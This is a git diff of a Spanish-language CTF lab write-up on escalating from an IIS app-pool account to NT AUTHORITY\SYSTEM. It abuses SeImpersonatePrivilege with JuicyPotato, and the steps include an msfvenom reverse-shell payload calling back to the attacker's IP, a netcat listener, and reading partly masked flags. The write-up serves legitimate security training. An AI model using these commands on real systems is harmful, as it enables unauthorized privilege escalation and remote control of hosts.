@@ -318,30 +318,116 @@ Enunciado :
       whoami
       iis apppool\retro
 
-  INFO: El IIS AppPool\ es una cuenta especial utilizada por el servicio de IIS (Internet Information Services) 
-  en sistemas Windows para ejecutar aplicaciones web dentro de un "pool" de aplicaciones específico. 
-  Los permisos de esta cuenta dependen de cómo esté configurada la seguridad en su servidor web y en su aplicación web.
+      INFO: El IIS AppPool\ es una cuenta especial utilizada por el servicio de IIS (Internet Information Services) 
+      en sistemas Windows para ejecutar aplicaciones web dentro de un "pool" de aplicaciones específico. 
+      Los permisos de esta cuenta dependen de cómo esté configurada la seguridad en su servidor web y en su aplicación web.
 
-- Verificamos los privilegios que tenemos como dicho usuario
+- Verificamos los privilegios que tenemos como dicho usuario y vemos la informacion del sistema.
 
       C:\Users>whoami /priv
       whoami /priv
       
       PRIVILEGES INFORMATION
       ----------------------
-      
       Privilege Name                Description                               State   
       ============================= ========================================= ========
       SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
       SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
       SeAuditPrivilege              Generate security audits                  Disabled
       SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
-      SeImpersonatePrivilege        Impersonate a client after authentication Enabled ------> Bingo podemos explotar esta vuln
+      SeImpersonatePrivilege        Impersonate a client after authentication Enabled ------> Bingo
       SeCreateGlobalPrivilege       Create global objects                     Enabled 
       SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 
+      C:\Users>systeminfo
+      systeminfo
+      
+      Host Name:                 RETROWEB
+      OS Name:                   Microsoft Windows Server 2016 Standard
+      OS Version:                10.0.14393 N/A Build 14393
+      OS Manufacturer:           Microsoft Corporation
+
+  Segun la info obtenida podemos realizar un ataque con juicypotato para elevar privilegios y llegar a NT AUTHORITY\SYSTEM.
+  SeImpersonatePrivilege – Windows Privilege Escalation --> https://juggernaut-sec.com/seimpersonateprivilege/
+
+      INFO: El privilegio "SeImpersonatePrivilege" (o "Impersonate a client after authentication") es un privilegio de seguridad
+      en sistemas Windows que permite a un proceso ejecutarse en el contexto de seguridad de un usuario o cliente después de autenticarse.
+      En otras palabras, un proceso con este privilegio puede asumir la identidad de un usuario autenticado y realizar acciones en su nombre.
+
+  1) Nos descargamos Juicypotato en nuestra maquina y montamos un servcio para compartilo com hemos hecho anteriormente.
+ 
+     Descargar --> https://github.com/ohpe/juicy-potato/releases/tag/v0.1
+
+  2) Nos descargamos juicypotato en la maquina victima.
+
+     ![image](https://github.com/Esevka/CTF/assets/139042999/afe08ef0-ef9c-45a1-b490-38c9c93722a5)
+
+          C:\inetpub\wwwroot\retro\wp-content\themes\90s-retro>dir
+           Volume in drive C has no label.
+           Volume Serial Number is 7443-948C
+          
+           Directory of C:\inetpub\wwwroot\retro\wp-content\themes\90s-retro
+          
+          09/18/2023  09:49 AM    <DIR>          .
+          09/18/2023  09:49 AM    <DIR>          ..
+          09/18/2023  08:46 AM             4,613 404.php
+          12/08/2019  05:19 PM    <DIR>          js
+          09/18/2023  09:49 AM           347,648 juicypotato.exe
+          12/08/2019  05:19 PM    <DIR>          languages
+          09/18/2023  09:02 AM            45,272 nc.exe
+
+  3) Nos creamos una reverse shell que tenemos que subir a la maquina victima de la misma manera que hemos subido juicypotato.
+
+          ┌──(root㉿kali)-[/home/…/ctf/try_ctf/retro/content]
+          └─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.64.232 LPORT=2000 -f exe  -o Wshell.exe
+          [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+          [-] No arch selected, selecting arch: x64 from the payload
+          No encoder specified, outputting raw payload
+          Payload size: 460 bytes
+          Final size of exe file: 7168 bytes
+          Saved as: Wshell.exe
+
+  4) Ejecutamos el exploit y elevamos privilegios.
+ 
+     Nos ponemos en escucha a la espera de la nueva conexion por el puerto 2000.
+     Ejecutamos el exploit.
+
+          C:\inetpub\wwwroot\retro\wp-content\themes\90s-retro>juicypotato.exe -t * -p Wshell.exe -l 456
+          juicypotato.exe -t * -p Wshell.exe -l 456
+          Testing {4991d34b-80a1-4291-83b6-3328366b9097} 456
+          ......
+          [+] authresult 0
+          {4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+          
+          [+] CreateProcessWithTokenW OK
+
+      Obtenemos conexion como usuario nt authority\system(Administrador del SO), obtenemos flags.
+
+          ──(root㉿kali)-[/home/…/ctf/try_ctf/retro/content]
+          └─# rlwrap nc -lnvp 2000
+          listening on [any] 2000 ...
+          connect to [10.8.64.232] from (UNKNOWN) [10.10.7.22] 50052
+          Microsoft Windows [Version 10.0.14393]
+          (c) 2016 Microsoft Corporation. All rights reserved.
+          
+          C:\Windows\system32>whoami
+          whoami
+          nt authority\system
+
+         C:\Users\Wade\Desktop>type user.txt.txt
+          type user.txt.txt
+          3b99fbdc6d430b.......c651a261927
+
+          C:\Users\Administrator\Desktop>type root.txt.txt
+          type root.txt.txt
+          7958b56956--------f22d1c4063
+
+       
 
      
+
+       
+
      
      
      
